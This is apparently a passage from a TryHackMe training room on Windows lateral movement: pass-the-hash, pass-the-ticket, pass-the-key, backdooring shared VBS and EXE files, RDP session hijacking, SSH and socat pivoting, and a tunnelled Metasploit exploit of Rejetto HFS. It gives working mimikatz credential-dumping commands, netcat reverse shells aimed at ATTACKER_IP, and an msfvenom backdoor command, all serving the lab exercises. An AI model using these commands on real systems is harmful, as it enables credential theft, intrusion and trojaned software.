be used as the tool of choice for credential extraction throughout the 
room.

## NTLM Authentication

Before diving into the actual lateral movement techniques, let's take a look at how NTLM authentication works:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9434c96e1bc0519f8d851b44d85b6702.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9434c96e1bc0519f8d851b44d85b6702.png)

1. The client sends an authentication request to the server they want to access.
2. The server generates a random number and sends it as a challenge to the client.
3. The client combines his NTLM password hash with the challenge (and other known data) to generate a
response to the challenge and sends it back to the server for
verification.
4. The server forwards both the challenge and the response to the Domain Controller for verification.
5. The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they
both match, the client is authenticated; otherwise, access is denied.
The authentication result is sent back to the server.
6. The server forwards the authentication result to the client.

**Note:** The described process applies when using a 
domain account. If a local account is used, the server can verify the 
response to the challenge itself without requiring interaction with the 
domain controller since it has the password hash stored locally on its 
SAM.

## Pass-the-Hash

As a result of extracting credentials from a host where we have
 attained administrative privileges (by using mimikatz or similar 
tools), we might get clear-text passwords or hashes that can be easily 
cracked. However, if we aren't lucky enough, we will end up with 
non-cracked NTLM password hashes.

Although it may seem we can't really use those hashes, the NTLM
 challenge sent during authentication can be responded to just by 
knowing the password hash. This means we can authenticate without 
requiring the plaintext password to be known. Instead of having to crack
 NTLM hashes, if the Windows domain is configured to use NTLM 
authentication, we can **Pass-the-Hash** (PtH) and authenticate successfully.

To extract NTLM hashes, we can either use mimikatz to read the local SAM or extract hashes directly from LSASS memory.

**Extracting NTLM hashes from local SAM:**

This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.

THMJMP2: Powershell

```
mimikatz # privilege::debugmimikatz # token::elevatemimikatz # lsadump::sam   RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

**Extracting NTLM hashes from LSASS memory:**

This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.

THMJMP2: Powershell

```
mimikatz # privilege::debugmimikatz # token::elevatemimikatz # sekurlsa::msv Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```

We can then use the extracted hashes to perform a PtH attack by using
 mimikatz to inject an access token for the victim user on a reverse 
shell (or any other command you like) as follows:

```
mimikatz # token::revertmimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

Notice we used `token::revert` to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work.

This would be the equivalent of using `runas /netonly`
 but with a hash instead of a password and will spawn a new reverse 
shell from where we can launch any command as the victim user.

To receive the reverse shell, we should run a reverse listener on our AttackBox:

AttackBox

```
user@AttackBox$ nc -lvp 5555
```

Interestingly, if you run the whoami command on this shell, it will 
still show you the original user you were using before doing PtH, but 
any command run from here will actually use the credentials we injected 
using PtH.

**Passing the Hash Using Linux:**

If you have access to a linux box (like your AttackBox), several 
tools have built-in support to perform PtH using different protocols. 
Depending on which services are available to you, you can do the 
following:

*Connect to RDP using PtH:*

```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

*Connect via psexec using PtH:*

```
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

**Note:** Only the linux version of psexec support PtH.

*Connect to WinRM using PtH:*

```
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

## Kerberos Authentication

Let's have a quick look at how Kerberos authentication works on Windows networks:

1. The user sends his username and a timestamp encrypted using a key derived from his password to the **Key Distribution Center (KDC)**, a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.
    
    The KDC will create and send back a **Ticket Granting Ticket (TGT)**,
     allowing the user to request tickets to access specific services 
    without passing their credentials to the services themselves. Along with
     the TGT, a **Session Key** is given to the user, which they will need to generate the requests that follow.
    
    Notice the TGT is encrypted using the **krbtgt** account's password hash, so the user can't access its contents. It is important to know that the encrypted TGT
     includes a copy of the Session Key as part of its contents, and the KDC
     has no need to store the Session Key as it can recover a copy by 
    decrypting the TGT if needed.
    

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/855d6fa3ea4076164934a2ba9717ffb5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/855d6fa3ea4076164934a2ba9717ffb5.png)

1. When users want to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a **Ticket Granting Service (TGS)**. TGS are tickets that allow connection only to the specific service for
which they were created. To request a TGS, the user will send his
username and a timestamp encrypted using the Session Key, along with the TGT and a **Service Principal Name (SPN),** which indicates the service and server name we intend to access.
    
    As a result, the KDC will send us a TGS and a **Service Session Key**, which we will need to authenticate to the service we want to access. The TGS is encrypted using the **Service Owner Hash**.
     The Service Owner is the user or machine account under which the 
    service runs. The TGS contains a copy of the Service Session Key on its 
    encrypted contents so that the Service Owner can access it by decrypting
     the TGS.
    

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0db01f1f1434f33fa8fb11de2bd165a6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0db01f1f1434f33fa8fb11de2bd165a6.png)

1. The TGS can then be sent to the desired service to authenticate and
establish a connection. The service will use its configured account's
password hash to decrypt the TGS and validate the Service Session Key.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png)

## Pass-the-Ticket

Sometimes it will be possible to extract Kerberos
 tickets and session keys from LSASS memory using mimikatz. The process 
usually requires us to have SYSTEM privileges on the attacked machine 
and can be done as follows:

```
mimikatz # privilege::debugmimikatz # sekurlsa::tickets /export
```

Notice that if we only had access to a ticket but not its 
corresponding session key, we wouldn't be able to use that ticket; 
therefore, both are necessary.

While mimikatz can extract any TGT
 or TGS available from the memory of the LSASS process, most of the 
time, we'll be interested in TGTs as they can be used to request access 
to any services the user is allowed to access. At the same time, TGSs 
are only good for a specific service. Extracting TGTs will require us to
 have administrator's credentials, and extracting TGSs can be done with a
 low-privileged account (only the ones assigned to that account).

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:

```
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

Injecting tickets in our own session doesn't require administrator 
privileges. After this, the tickets will be available for any tools we 
use for lateral movement. To check if the tickets were correctly 
injected, you can use the klist command:

THMJMP2: Powershell

```
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

## Overpass-the-hash / Pass-the-Key

This kind of attack is similar to PtH but applied to Kerberos networks.

When a user requests a TGT,
 they send a timestamp encrypted with an encryption key derived from 
their password. The algorithm used to derive this key can be either DES 
(disabled by default on current Windows versions), RC4, AES128 or 
AES256, depending on the installed Windows version and Kerberos 
configuration. If we have any of those keys, we can ask the KDC for a 
TGT without requiring the actual password, hence the name **Pass-the-key (PtK)**.

We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:

```
mimikatz # privilege::debugmimikatz # sekurlsa::ekeys
```

Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key (`nc64` is already available in THMJMP2 for your convenience):

**If we have the RC4 hash:**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES128 hash:**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES256 hash:**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

Notice that when using RC4, the key will be equal to the NTLM
 hash of a user. This means that if we could extract the NTLM hash, we 
can use it to request a TGT as long as RC4 is one of the enabled 
protocols. This particular variant is usually known as **Overpass-the-Hash (OPtH)**.

To receive the reverse shell, we should run a reverse listener on our AttackBox:

AttackBox

```
user@AttackBox$ nc -lvp 5556
```

Just as with PtH, any command run from this shell will use the credentials injected via mimikatz.

## Let's Get to Work!

To begin this exercise, you will need to connect to THMJMP2 using the following credentials via SSH:

User: ZA.TRYHACKME.COM\t2_felicia.dean

Password: iLov3THM!

`ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com`

These credentials will grant you administrative access to THMJMP2, 
allowing you to use mimikatz to dump the authentication material needed 
to perform any of the techniques presented during this task.

Using your SSH
 session, use mimikatz to extract authentication material and perform 
Pass-the-Hash, Pass-the-Ticket or Pass-the-Key against domain user `t1_toby.beck`.

Once you have a command prompt with his credentials loaded, use `winrs`
 to connect to a command prompt on THMIIS. Since t1_toby.beck's 
credentials are already injected in your session as a result of any of 
the attacks, you can use winrs without specifying any credentials, and 
it will use the ones available to your current session:

```
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

You'll find a flag on t1_toby.beck's desktop on THMIIS. Both `mimikatz` and `psexec64` are available at `C:\tools` on THMJMP2.

**Abusing User Behaviour**

Under certain 
circumstances, an attacker can take advantage of actions performed by 
users to gain further access to machines in the network. While there are
 many ways this can happen, we will look at some of the most common 
ones.

## Abusing Writable Shares

It is quite common to find network shares that legitimate users use 
to perform day-to-day tasks when checking corporate environments. If 
those shares are writable for some reason, an attacker can plant 
specific files to force users into executing any arbitrary payload and 
gain access to their machines.

One common scenario consists of finding a shortcut to a script or executable file hosted on a network share.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/70e361f2a43b498e5d487d0394bd0a87.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/70e361f2a43b498e5d487d0394bd0a87.png)

The rationale behind this is that the administrator can maintain an 
executable on a network share, and users can execute it without copying 
or installing the application to each user's machine. If we, as 
attackers, have write permissions over such scripts or executables, we 
can backdoor them to force users to execute any payload we want.

Although the script or executable is hosted on a server, when a user 
opens the shortcut on his workstation, the executable will be copied 
from the server to its `%temp%` folder and executed on the 
workstation. Therefore any payload will run in the context of the final 
user's workstation (and logged-in user account).

### Backdooring .vbs Scripts

As an example, if the shared resource is a VBS script, we can put a 
copy of nc64.exe on the same share and inject the following code in the 
shared script:

```
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

This will copy nc64.exe from the share to the user's workstation `%tmp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.

### Backdooring .exe Files

If the shared file is a Windows binary, say putty.exe, you can 
download it from the share and use msfvenom to inject a backdoor into 
it. The binary will still work as usual but execute an additional 
payload silently. To create a backdoored putty.exe, we can use the 
following command:

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter
 payload without the user noticing it. Once the file has been generated,
 we can replace the executable on the windows share and wait for any 
connections using the exploit/multi/handler module from Metasploit.

## RDP hijacking

When an administrator uses Remote Desktop to connect to a machine and closes the RDP
 client instead of logging off, his session will remain open on the 
server indefinitely. If you have SYSTEM privileges on Windows Server 
2016 and earlier, you can take over any existing RDP session without 
requiring a password.

If we have administrator-level access, we can get SYSTEM by any 
method of our preference. For now, we will be using psexec to do so. 
First, let's run a cmd.exe as administrator:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7ba63227fb9d7244d5814b0e4fd57793.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7ba63227fb9d7244d5814b0e4fd57793.png)

From there, run `PsExec64.exe`(available at `C:\tools\`):

```
PsExec64.exe -s cmd.exe
```

To list the existing sessions on a server, you can use the following command:

Command Prompt

```
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                    3  Disc            .  4/6/2022 6:51 AM
```

According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be `rdp-tcp#6`. We can also see that a user named luke has left a session open with id `3`. Any session with a **Disc**
 state has been left open by the user and isn't being used at the 
moment. While you can take over active sessions as well, the legitimate 
user will be forced out of his session when you do, which could be 
noticed by them.

To connect to a session, we will use tscon.exe and specify the 
session ID we will be taking over, as well as our current SESSIONNAME. 
Following the previous example, to takeover luke's session if we were 
connected as the administrator user, we'd use the following command:

```
tscon 3 /dest:rdp-tcp#6
```

In simple terms, the command states that the graphical session `3` owned by luke, should be connected with the RDP session `rdp-tcp#6`, owned by the administrator user.

As a result, we'll resume luke's RDP session and connect to it immediately.

**Note:** Windows Server 2019 won't allow you to connect to another user's session without knowing its password.

**Port Forwarding**

Most of the 
lateral movement techniques we have presented require specific ports to 
be available for an attacker. In real-world networks, the administrators
 may have blocked some of these ports for security reasons or have 
implemented segmentation around the network, preventing you from 
reaching SMB, RDP, WinRM or RPC ports.

To go around these restrictions, we can use port forwarding 
techniques, which consist of using any compromised host as a jump box to
 pivot to other hosts. It is expected that some machines will have more 
network permissions than others, as every role in a business will have 
different needs in terms of what network services are required for 
day-to-day work.

## SSH Tunnelling

The first protocol we'll be looking at is SSH, as it already has built-in functionality to do port forwarding through a feature called **SSH Tunneling**. While SSH
 used to be a protocol associated with Linux systems, Windows now ships 
with the OpenSSH client by default, so you can expect to find it in many
 systems nowadays, independent of their operating system.

SSH
 Tunnelling can be used in different ways to forward ports through an 
SSH connection, which we'll use depending on the situation. To explain 
each case, let's assume a scenario where we've gained control over the 
PC-1 machine (it doesn't need to be administrator access) and would like
 to use it as a pivot to access a port on another machine to which we 
can't directly connect. We will start a tunnel from the PC-1 machine, 
acting as an SSH client, to the Attacker's PC, which will act as an SSH 
server. The reason to do so is that you'll often find an SSH client on 
Windows machines, but no SSH server will be available most of the time.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9fb527b63773be22aa214ea2d06d1351.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9fb527b63773be22aa214ea2d06d1351.png)

Since we'll be making a connection back to our attacker's machine, 
we'll want to create a user in it without access to any console for 
tunnelling and set a password to use for creating the tunnels:

```
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

Depending on your needs, the SSH tunnel can be used to do either local or remote port forwarding. Let's take a look at each case.

### SSH Remote Port Forwarding

In our example, let's assume that firewall policies block the 
attacker's machine from directly accessing port 3389 on the server. If 
the attacker has previously compromised PC-1 and, in turn, PC-1 has 
access to port 3389 of the server, it can be used to pivot to port 3389 
using remote port forwarding from PC-1. **Remote port forwarding** allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a **remote** SSH server (the attacker's machine).

As a result, a port will be opened in the attacker's machine 
that can be used to connect back to port 3389 in the server through the SSH tunnel. PC-1 will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from PC-1:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/49401a0687c38a1ce78fdd5852aca5a7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/49401a0687c38a1ce78fdd5852aca5a7.png)

A valid question that might pop up by this point is why we need port forwarding if we have compromised PC-1 and can run an RDP
 session directly from there. The answer is simple: in a situation where
 we only have console access to PC-1, we won't be able to use any RDP 
client as we don't have a GUI. By making the port available to your 
attacker's machine, you can use a Linux RDP client to connect. Similar 
situations arise when you want to run an exploit against a port that 
can't be reached directly, as your exploit may require a specific 
scripting language that may not always be available at machines you 
compromise along the way.

Referring to the previous image, to forward port 3389 on the server 
back to our attacker's machine, we can use the following command on 
PC-1:

PC1: Command Prompt

```
C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

This will establish an SSH session from PC-1 to `1.1.1.1` (Attacker PC) using the `tunneluser` user.

Since the `tunneluser` isn't allowed to run a shell on the Attacker PC, we need to run the `ssh` command with the `-N` switch to prevent the client from requesting one, or the connection will exit immediately. The `-R`
 switch is used to request a remote port forward, and the syntax 
requires us first to indicate the port we will be opening at the SSH
 server (3389), followed by a colon and then the IP and port of the 
socket we'll be forwarding (3.3.3.3:3389). Notice that the port numbers 
don't need to match, although they do in this example.

The command itself won't output anything, but the tunnel will depend 
on the command to be running. Whenever we want, we can close the tunnel 
by pressing CTRL+C as with any other command.

Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:

Attacker's Machine

```
munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

### SSH Local Port Forwarding

**Local port forwarding** allows us to "pull" a port from an SSH
 server into the SSH client. In our scenario, this could be used to take
 any service available in our attacker's machine and make it available 
through a port on PC-1. That way, any host that can't connect directly 
to the attacker's PC but can connect to PC-1 will now be able to reach 
the attacker's services through the pivot host.

Using this type of port forwarding would allow us to run reverse 
shells from hosts that normally wouldn't be able to connect back to us 
or simply make any service we want available to machines that have no 
direct connection to us.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/23c086c89a5bbe2fa364c95064235fb5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/23c086c89a5bbe2fa364c95064235fb5.png)

To forward port 80 from the attacker's machine and make it available from PC-1, we can run the following command on PC-1:

PC1: Command Prompt

```
C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

The command structure is similar to the one used in remote port forwarding but uses the `-L` option for local port forwarding. This option requires us to indicate the local socket used by PC-1 to receive connections (`*:80`) and the remote socket to connect to from the attacker's PC perspective (`127.0.0.1:80`).

Notice that we use the IP address 127.0.0.1 in the second socket, as 
from the attacker's PC perspective, that's the host that holds the port 
80 to be forwarded.

Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with `dir=in`). Administrative privileges are needed for this:

```
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

Once your tunnel is set up, any user pointing their browsers to PC-1 at `http://2.2.2.2:80` and see the website published by the attacker's machine.

## Port Forwarding With socat

In situations where SSH
 is not available, socat can be used to perform similar functionality. 
While not as flexible as SSH, socat allows you to forward ports in a 
much simpler way. One of the disadvantages of using socat is that we 
need to transfer it to the pivot host (PC-1 in our current example), 
making it more detectable than SSH, but it might be worth a try where no
 other option is available.

The basic syntax to perform port forwarding using socat is much 
simpler. If we wanted to open port 1234 on a host and forward any 
connection we receive there to port 4321 on host 1.1.1.1, you would have
 the following command:

```
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
```

The `fork` option allows socat to fork a 
new process for each connection received, making it possible to handle 
multiple connections without closing. If you don't include it, socat 
will close when the first connection made is finished.

Coming back to our example, if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command:

PC-1: Command Prompt

```
C:\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```

Note that socat can't forward the connection directly to the attacker's machine as SSH did but will open a port on PC-1 that the attacker's machine can then connect to:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d7128a0e5d344785ed570c2b8b90c775.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d7128a0e5d344785ed570c2b8b90c775.png)

As usual, since a port is being opened on the pivot host, we might 
need to create a firewall rule to allow any connections to that port:

```
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

If, on the other hand, we'd like to expose port 80 from the 
attacker's machine so that it is reachable by the server, we only need 
to adjust the command a bit:

PC-1: Command Prompt

```
C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

As a result, PC-1 will spawn port 80 and listen for connections to be forwarded to port 80 on the attacker's machine:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4874c8eb2e92a55b93c3dbbc2409e54b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4874c8eb2e92a55b93c3dbbc2409e54b.png)

### Dynamic Port Forwarding and SOCKS

While single port forwarding works quite well for tasks that require 
access to specific sockets, there are times when we might need to run 
scans against many ports of a host, or even many ports across many 
machines, all through a pivot host. In those cases, **dynamic port forwarding** allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a **SOCKS proxy**.

Since we don't want to rely on an SSH
 server existing on the Windows machines in our target network, we will 
normally use the SSH client to establish a reverse dynamic port 
forwarding with the following command:

PC1: Command Prompt

```
C:\> ssh tunneluser@1.1.1.1 -R 9050 -N
```

In this case, the SSH server will start a SOCKS proxy on port `9050`, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.

The most interesting part is that we can easily use any of our tools through the SOCKS proxy by using **proxychains**.
 To do so, we first need to make sure that proxychains is correctly 
configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at `/etc/proxychains.conf`
 on your AttackBox. If we scroll down to the end of the configuration 
file, we should see a line that indicates the port in use for socks 
proxying:

```
[ProxyList]
socks4  127.0.0.1 9050
```

The default port is 9050, but any port will work as long as it matches the one we used when establishing the SSH tunnel.

If we now want to execute any command through the proxy, we can use proxychains:

```
proxychains curl http://pxeboot.za.tryhackme.com
```

Note that some software like nmap might not work well with SOCKS in 
some circumstances, and might show altered results, so your mileage 
might vary.

## Let's Get to Work!

**Note:** Since you will be doing SSH connections from the lab network back to your attacker machine using the `tunneluser` for this task, we highly encourage you to use the Attackbox or a VM
 instead of your actual machine. Instructions have been given on 
creating a user that won't allow running commands or transferring files 
via SSH/SCP, so be sure to follow them as provided. It is also 
recommended to create a strong password for `tunneluser` and make sure it is a unique and discardable password, not your actual password in this or any other platform.

To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you in Task 1 from [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds). If you haven't done so yet, click on the link and get credentials now. Once you have your credentials, connect to THMJMP2 via SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

Our first objective will be to connect via RDP
 to THMIIS. If we try to connect directly from our attacker machine, we 
will find that port 3389 has been filtered via a firewall and is 
therefore not available directly. However, the port is up and running 
but can only be accessed from THMJMP2. By using socat, which is 
available on `C:\tools\socat\` on THMJMP2, we will forward the RDP port to make it available on THMJMP2 to connect from our attacker's machine.

To do so, we will run socat with the following parameters:

THMJMP2: Command Prompt

```
C:\tools\socat\>socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
```

Note that we can't use port 3389 for our listener since it is already being used in THMJMP2 for its own RDP
 service. Feel free to change the listener port (13389) to a different 
number to avoid clashing with other students. In a typical setup, you'd 
have to add a firewall rule to allow traffic through the listener port, 
but THMJMP2 has its firewall disabled for your convenience.

Once the listener has been set up, you should be able to connect to THMIIS via RDP from your attacker machine by pivoting through your socat listener at THMJMP2:

AttackBox

```
user@AttackBox$ xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

Once connected, you should get a flag from t1_thomas.moore's desktop on THMIIS.

## Tunnelling Complex Exploits

The THMDC server is running
 a vulnerable version of Rejetto HFS. The problem we face is that 
firewall rules restrict access to the vulnerable port so that it can 
only be viewed from THMJMP2. Furthermore, outbound connections from 
THMDC are only allowed machines in its local network, making it 
impossible to receive a reverse shell directly to our attacker's 
machine. To make things worse, the Rejetto HFS exploit requires the 
attacker to host an HTTP
 server to trigger the final payload, but since no outbound connections 
are allowed to the attacker's machine, we would need to find a way to 
host a web server in one of the other machines in the same network, 
which is not at all convenient. We can use port forwarding to overcome 
all of these problems.

First, let's take a look at how the exploit works. First, it will connect to the HFS port (`RPORT` in Metasploit) to trigger a second connection. This second connection will be made against the attacker's machine on `SRVPORT`,
 where a web server will deliver the final payload. Finally, the 
attacker's payload will execute and send back a reverse shell to the 
attacker on `LPORT`:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/618de3db53e103f3df56ae922f66e879.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/618de3db53e103f3df56ae922f66e879.png)

With this in mind, we could use SSH
 to forward some ports from the attacker's machine to THMJMP2 (SRVPORT 
for the web server and LPORT to receive the reverse shell) and pivot 
through THMJMP2 to reach RPORT on THMDC. We would need to do three port 
forwards in both directions so that all the exploit's interactions can 
be proxied through THMJMP2:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dbbc833670f1a7ed6f76eeac7d8bd1ee.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dbbc833670f1a7ed6f76eeac7d8bd1ee.png)

Rejetto
 HFS will be listening on port 80 on THMDC, so we need to tunnel that 
port back to our attacker's machine through THMJMP2 using remote port 
forwarding. Since the attackbox has port 80 occupied with another 
service, we will need to link port 80 on THMDC with some port not 
currently in use by the attackbox. Let's use port 8888. When running ssh
 in THMJMP2 to forward this port, we would have to add `-R 8888:thmdc.za.tryhackme.com:80` to our command.

For SRVPORT and LPORT, let's choose two random ports at will. For demonstrative purposes, we'll set `SRVPORT=6666` and `LPORT=7878`,
 but be sure to use different ports as the lab is shared with other 
students, so if two of you choose the same ports, when trying to forward
 them, you'll get an error stating that such port is already in use on 
THMJMP2.

To forward such ports from our attacker machine to THMJMP2, we will use local port forwarding by adding `-L *:6666:127.0.0.1:6666` and `-L *:7878:127.0.0.1:7878` to our ssh command. This will bind both ports on THMJMP2 and tunnel any connection back to our attacker machine.

Putting the whole command together, we would end up with the following:

THMJMP2: Command Prompt

```
C:\> ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```

**Note:** If you are using the AttackBox and have joined other 
network rooms before, be sure to select the IP address assigned to the 
tunnel interface facing the `lateralmovementandpivoting` 
network as your ATTACKER_IP, or else your reverse shells/connections 
won't work properly. For your convenience, the interface attached to 
this network is called `lateralmovement`, so you should be able to get the right IP address by running `ip add show lateralmovement`:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b6b6f6f3ef517c092e52c4bca4941129.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b6b6f6f3ef517c092e52c4bca4941129.png)

Once all port forwards are in place, we can start Metasploit and configure the exploit so that the required ports match the ones we have forwarded through THMJMP2:

AttackBox

```
user@AttackBox$ msfconsolemsf6 > use rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp

msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7878
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666

msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

There is a lot to unpack here:

- The **LHOST** parameter
usually serves two purposes: it is used as the IP where a listener is
bound on the attacker's machine to receive a reverse shell; it is also
embedded on the payload so that the victim knows where to connect back
when the exploit is triggered. In our specific scenario, since THMDC
won't be able to reach us, we need to force the payload to connect back
to THMJMP2, but we need the listener to bind to the attacker's machine
on `127.0.0.1`. To this end, Metasploit provides an optional parameter `ReverseListenerBindAddress`, which can be used to specify the listener's bind address on the
attacker's machine separately from the address where the payload will
connect back. In our example, we want the reverse shell listener to be
bound to 127.0.0.1 on the attacker's machine and the payload to connect
back to THMJMP2 (as it will be forwarded to the attacker machine through the SSH tunnel).
